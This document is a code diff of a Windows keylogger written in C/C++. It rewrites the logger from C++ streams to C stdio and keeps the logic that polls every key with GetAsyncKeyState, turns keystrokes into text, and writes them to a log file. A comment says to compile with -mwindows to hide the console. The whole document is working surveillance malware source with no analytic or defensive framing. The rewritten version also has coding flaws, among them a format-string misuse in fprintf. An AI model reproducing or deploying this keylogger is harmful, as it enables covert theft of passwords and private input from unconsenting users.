@@ -1,7 +1,5 @@
-#include <iostream>
+#include <stdio.h>
 #include <windows.h>
-#include <fstream>
-
 #include "vk.h"
 
 // compile with -mwindows to hide console
@@ -11,11 +9,10 @@ bool clean = true;
 
 bool isShift() { return (((1 << 15 ) & GetAsyncKeyState(VK_LSHIFT)) ? true : false); }
 
-std::string CaptureKeyPress(const int& key, const bool& clean) {
+const char* CaptureKeyPress(const int& key, const bool& clean) {
 	
 	switch (key) {
 		
-		// letters
 		case VK_KEY_A: { return (isShift() ? "A" : "a"); break; }
 		case VK_KEY_B: { return (isShift() ? "B" : "b"); break; }
 		case VK_KEY_C: { return (isShift() ? "C" : "c"); break; }
@@ -43,7 +40,6 @@ std::string CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_KEY_Y: { return (isShift() ? "Y" : "y"); break; }
 		case VK_KEY_Z: { return (isShift() ? "Z" : "z"); break; }
 		
-		// numbers
 		case VK_KEY_1: { return (isShift() ? "!" : "1"); break; }
 		case VK_KEY_2: { return (isShift() ? "@" : "2"); break; }
 		case VK_KEY_3: { return (isShift() ? "#" : "3"); break; }
@@ -66,35 +62,31 @@ std::string CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_OEM_6: { return (isShift() ? "}"  : "]");  break; }
 		case VK_OEM_7: { return (isShift() ? "\"" : "\'"); break; }
 		
-		//OTHER CHARS
 		case VK_OEM_COMMA:  { return (isShift() ? "<" : ","); break; } 
 		case VK_OEM_PERIOD: { return (isShift() ? ">" : "."); break; } 
 		
-		//MAIN
 		case VK_ESCAPE: { return "[ESC]"; break; }
 		case VK_SPACE:  { return " ";     break; }
 		case VK_RETURN: { return (clean ? "\n" : "\\n"); break; }
 		case VK_BACK:   { return (clean ? "\b" : "\\b"); break; }
 		
-		//LOCKS
 		case VK_NUMLOCK: { return "[LOCK_NUM]"; break; }
 		case VK_SCROLL:  { return "[LOCK_SCR]"; break; }
 		case VK_CAPITAL: { return "[LOCK_CAP]"; break; }
 		
-		//SIDE
-		//case VK_SHIFT:  { return std::string("[SHIFT]");  break; }
-		//case VK_LSHIFT: { return std::string("[LSHIFT]"); break; }
-		//case VK_RSHIFT: { return std::string("[RSHIFT]"); break; }
+		////shift
+		//case VK_SHIFT:  { return "[SHIFT]";  break; }
+		//case VK_LSHIFT: { return "[LSHIFT]"; break; }
+		//case VK_RSHIFT: { return "[RSHIFT]"; break; }
 		
-	    case VK_LCONTROL: { return (clean ? "" : "[LCONTROL]"); break; }
-		case VK_RCONTROL: { return (clean ? "" : "[RCONTROL]"); break; }
-		case VK_TAB:      { return (clean ? "" : "[TAB]"     ); break; }
-		case VK_MENU:     { return (clean ? "" : "[ALT]"     ); break; }
+	    case VK_LCONTROL: { return "[LCONTROL]"; break; }
+		case VK_RCONTROL: { return "[RCONTROL]"; break; }
+		case VK_TAB:      { return "[TAB]";      break; }
+		case VK_MENU:     { return "[ALT]";      break; }
 		
 		case VK_LWIN: { return "[LWIN]"; break; }
 		case VK_RWIN: { return "[RWIN]"; break; }
 		
-		//NUMPAD ON
 		case VK_NUMPAD0:  { return "[NUM0]"; break; }
 		case VK_NUMPAD1:  { return "[NUM1]"; break; }
 		case VK_NUMPAD2:  { return "[NUM2]"; break; }
@@ -106,7 +98,6 @@ std::string CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_NUMPAD8:  { return "[NUM8]"; break; }
 		case VK_NUMPAD9:  { return "[NUM9]"; break; }
 		
-		//NUMPAD OFF
 		case VK_UP:    { return (clean ? "" : "[ARROW_UP]"   ); break; } 
 		case VK_DOWN:  { return (clean ? "" : "[ARROW_DOWN]" ); break; }
 		case VK_LEFT:  { return (clean ? "" : "[ARROW_LEFT]" ); break; }
@@ -117,54 +108,54 @@ std::string CaptureKeyPress(const int& key, const bool& clean) {
 		case VK_HOME:  { return "[HOME]"; break; }
 		case VK_END:   { return "[END]" ; break; }
 		
-		//NUMPAD EXTRA
-		case VK_DIVIDE:   { return std::string("/"); break; }
-		case VK_MULTIPLY: { return std::string("*"); break; }
-	    case VK_SUBTRACT: { return std::string("-"); break; }
-		case VK_ADD:      { return std::string("+"); break; }
-		case VK_DECIMAL:  { return std::string("."); break; }
+		case VK_DIVIDE:   { return "/"; break; }
+		case VK_MULTIPLY: { return "*"; break; }
+	    case VK_SUBTRACT: { return "-"; break; }
+		case VK_ADD:      { return "+"; break; }
+		case VK_DECIMAL:  { return "."; break; }
 		
-		//F1, F2, ...
-        case VK_F1:  { return std::string("[F1]");  break; }
-        case VK_F2:  { return std::string("[F2]");  break; }
-        case VK_F3:  { return std::string("[F3]");  break; }
-        case VK_F4:  { return std::string("[F4]");  break; }
-        case VK_F5:  { return std::string("[F5]");  break; }
-        case VK_F6:  { return std::string("[F6]");  break; }
-        case VK_F7:  { return std::string("[F7]");  break; }
-        case VK_F8:  { return std::string("[F8]");  break; }
-        case VK_F9:  { return std::string("[F9]");  break; }
-        case VK_F10: { return std::string("[F10]"); break; }
-        case VK_F11: { return std::string("[F11]"); break; }
-        case VK_F12: { return std::string("[F12]"); break; }
-        case VK_F13: { return std::string("[F13]"); break; }
-        case VK_F14: { return std::string("[F14]"); break; }
-        case VK_F15: { return std::string("[F15]"); break; }
-        case VK_F16: { return std::string("[F16]"); break; }
-        case VK_F17: { return std::string("[F17]"); break; }
-        case VK_F18: { return std::string("[F18]"); break; }
-        case VK_F19: { return std::string("[F19]"); break; }
-        case VK_F20: { return std::string("[F20]"); break; }
-        case VK_F21: { return std::string("[F21]"); break; }
-        case VK_F22: { return std::string("[F22]"); break; }
-        case VK_F23: { return std::string("[F23]"); break; }
-        case VK_F24: { return std::string("[F24]"); break; }
+        case VK_F1:  { return "[F1]";  break; }
+        case VK_F2:  { return "[F2]";  break; }
+        case VK_F3:  { return "[F3]";  break; }
+        case VK_F4:  { return "[F4]";  break; }
+        case VK_F5:  { return "[F5]";  break; }
+        case VK_F6:  { return "[F6]";  break; }
+        case VK_F7:  { return "[F7]";  break; }
+        case VK_F8:  { return "[F8]";  break; }
+        case VK_F9:  { return "[F9]";  break; }
+        case VK_F10: { return "[F10]"; break; }
+        case VK_F11: { return "[F11]"; break; }
+        case VK_F12: { return "[F12]"; break; }
+        case VK_F13: { return "[F13]"; break; }
+        case VK_F14: { return "[F14]"; break; }
+        case VK_F15: { return "[F15]"; break; }
+        case VK_F16: { return "[F16]"; break; }
+        case VK_F17: { return "[F17]"; break; }
+        case VK_F18: { return "[F18]"; break; }
+        case VK_F19: { return "[F19]"; break; }
+        case VK_F20: { return "[F20]"; break; }
+        case VK_F21: { return "[F21]"; break; }
+        case VK_F22: { return "[F22]"; break; }
+        case VK_F23: { return "[F23]"; break; }
+        case VK_F24: { return "[F24]"; break; }
 		
-		//OTHER
-		case VK_SNAPSHOT: { return std::string("[PrntScr]"); break; }
-		case VK_PAUSE:    { return std::string("[PAUSE]"  ); break; }
-		case VK_INSERT:   { return std::string("[INSERT]" ); break; }
-		case VK_DELETE:   { return std::string("[DELETE]" ); break; }
-		case VK_SLEEP:    { return std::string("[SLEEP]"  ); break; }
+		case VK_SNAPSHOT: { return "[PrntScr]"; break; }
+		case VK_PAUSE:    { return "[PAUSE]";   break; }
+		case VK_INSERT:   { return "[INSERT]";  break; }
+		case VK_DELETE:   { return "[DELETE]";  break; }
+		case VK_SLEEP:    { return "[SLEEP]";   break; }
 	}
 	
-	return std::string("[NULL]");
+	return "[NULL]";
 }
 
 int main(int argc, char* argv[]) {
 	
-	std::ofstream ofs;
-	ofs.open("keys.log", std::ofstream::out | std::ofstream::app);
+	FILE* f = fopen("file.txt", "w");
+	if (f == NULL) {
+		printf("Error opening file!\n");
+		return 1;
+	}
 	
 	bool run = true;
 	while (run) {
@@ -173,19 +164,20 @@ int main(int argc, char* argv[]) {
 			// -32768 = keyup
 			if (GetAsyncKeyState(i) == -32767) {
 				
-				std::string key = CaptureKeyPress(i, clean);
-				if (key == std::string("[NULL]")) { continue; }
+				const char* key = CaptureKeyPress(i, clean);
+				if (!strcmp(key, "[NULL]")) { continue; }
 				
-				std::cout << key;
-				ofs << key;
-				ofs.flush();
+				printf("%s", key);
+				fprintf(f, key);
 				
 				Sleep(10);
 			}
 		}
+		
+		fflush(f);
 	}
 	
-	ofs.close();
+	fclose(f);
 	
 	return 0;
 }
